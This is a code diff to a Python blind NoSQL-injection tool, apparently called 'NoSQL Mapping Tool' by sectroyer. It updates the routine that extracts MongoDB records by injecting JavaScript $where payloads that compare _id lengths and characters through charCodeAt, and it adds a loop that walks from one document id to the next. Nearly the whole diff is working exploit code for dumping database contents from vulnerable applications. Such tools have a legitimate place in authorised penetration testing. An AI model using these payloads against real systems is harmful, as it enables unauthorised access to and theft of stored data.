@@ -21,7 +21,7 @@ timeout_subdomain=hashlib.md5(random_str.encode()).hexdigest()
 def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
     global timeout_subdomain
     proxies={}
-    proxies={'http':'http://localhost:8080', 'https': 'http://localhost:8080'}
+    #proxies={'http':'http://localhost:8080', 'https': 'http://localhost:8080'}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
     try:
         if post_data:
@@ -197,39 +197,44 @@ def blind_dump_keys(target_url, injection_character, blind_string, post_data, co
 
 def blind_dump_values_for_keys(target_url, injection_character, blind_string, keys_array, post_data, cookies_dict, connection_timeout):
     values_array=[]
-    keys_array.append("_id")
+    values_array.append(keys_array)
     last_id='0'
+    current_id='0'
     # try to inject the payloads in target_url or post_data
     try:
-        blind_size_payload = injection_character + ";if (this._id.toString() > '_LAST_ID_' && this._CURRENT_KEY_.toString().length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
-        blind_value_payload = injection_character + ";if (this._id.toString() > '_LAST_ID_' && this._CURRENT_KEY_.toString().charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER%) { return true; } else { return false; };" + injection_character + "1"
-        #blind_id_size_payload = injection_character + ";if (this._id.toString() > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').startsWith('%DUMP_VALUE%') && this._id.toString().replace('ObjectId(\"','').replace('\")','').length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
+        blind_size_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') == '_CURRENT_ID_' && this._CURRENT_KEY_.toString().length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
+        blind_value_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') == '_CURRENT_ID_' && this._CURRENT_KEY_.toString().charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER%) { return true; } else { return false; };" + injection_character + "1"
         blind_id_size_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').length == %SIZE_OF_RESULT%) { return true; } else { return false; };" + injection_character + "1"
         blind_id_value_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_LAST_ID_' && this._id.toString().replace('ObjectId(\"','').replace('\")','').startsWith('%DUMP_VALUE%') && this._id.toString().replace('ObjectId(\"','').replace('\")','').charCodeAt(%CHARACTER_NUMBER%) == %CURRENT_CHARACTER%) { return true; } else { return false; };" + injection_character + "1"
         while True:
             current_values=[]
+            print(f"Checking if next id exists...")
+            blind_next_id_test_payload = injection_character + ";if (this._id.toString().replace('ObjectId(\"','').replace('\")','') > '_CURRENT_ID_') { return true; } else { return false; };" + injection_character + "1"
+            test_result = nosql_inject(target_url, blind_next_id_test_payload.replace("_CURRENT_ID_",current_id), post_data, cookies_dict, connection_timeout)
+            if blind_string in test_result:
+                print("Yes - dumping...")
+            else:
+                print("No - finishing.")
+                break
+            current_size_payload=blind_id_size_payload.replace("_LAST_ID_",last_id)
+            current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
+            print(f"Size of _id string:{current_value_size}")
+            current_value_payload=blind_id_value_payload.replace("_LAST_ID_",last_id)
+            current_value_dump_prefix=f"Value of _id string: " 
+            current_value=dump_string_value(target_url, current_value_dump_prefix, current_value_size, current_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
+            print("\n")
+            print(f"_id: {current_value}")
+            current_id=current_value.replace('ObjectId("', '').replace('")', '')
+            last_id=current_id
             for current_key in keys_array:
-                if current_key == "_id": 
-                    #current_size_payload=blind_size_payload.replace("_CURRENT_KEY_.toString()",current_key+".toString().replace('ObjectId(\"','').replace('\")','')").replace('_LAST_ID_',last_id)
-                    current_size_payload=blind_id_size_payload.replace("_LAST_ID_",last_id)
-                    current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
-                    print(f"Size of {current_key} string:{current_value_size}")
-                    #current_value_payload=blind_value_payload.replace("_CURRENT_KEY_",current_key+".toString().replace('ObjectId(\"','').replace('\")','')").replace('_LAST_ID_',last_id)
-                    current_value_payload=blind_id_value_payload.replace("_LAST_ID_",last_id)
-                else:
-                    current_size_payload=blind_size_payload.replace("_CURRENT_KEY_",current_key).replace('_LAST_ID_',last_id)
-                    current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
-                    print(f"Size of {current_key} string:{current_value_size}")
-                    current_value_payload=blind_value_payload.replace("_CURRENT_KEY_",current_key).replace('_LAST_ID_',last_id)
+                current_size_payload=blind_size_payload.replace("_CURRENT_KEY_",current_key).replace('_CURRENT_ID_',current_id)
+                current_value_size=get_size_of_result(target_url, current_size_payload, blind_string, post_data, cookies_dict, connection_timeout)
+                print(f"Size of {current_key} string:{current_value_size}")
+                current_value_payload=blind_value_payload.replace("_CURRENT_KEY_",current_key).replace('_CURRENT_ID_',current_id)
                 current_value_dump_prefix=f"Value of {current_key} string: " 
                 current_value=dump_string_value(target_url, current_value_dump_prefix, current_value_size, current_value_payload, blind_string, post_data, cookies_dict, connection_timeout)
                 print("\n")
                 print(f"{current_key}: {current_value}")
-                if not values_array:
-                    values_array.append(keys_array)
-                if current_key == "_id": 
-                    current_id=current_value.replace('ObjectId("', '').replace('")', '')
-                    last_id=current_id
                 current_values.append(current_value)
             values_array.append(current_values)
     except Exception as e:
@@ -476,7 +481,7 @@ def dump_ascii_table(data, shouldPrintHeader=False):
     print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
 
 
-print('\nNoSQL Mapping Tool by sectroyer v0.1\n')
+print('\nNoSQL Mapping Tool by sectroyer v0.3\n')
 
 try:
     parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
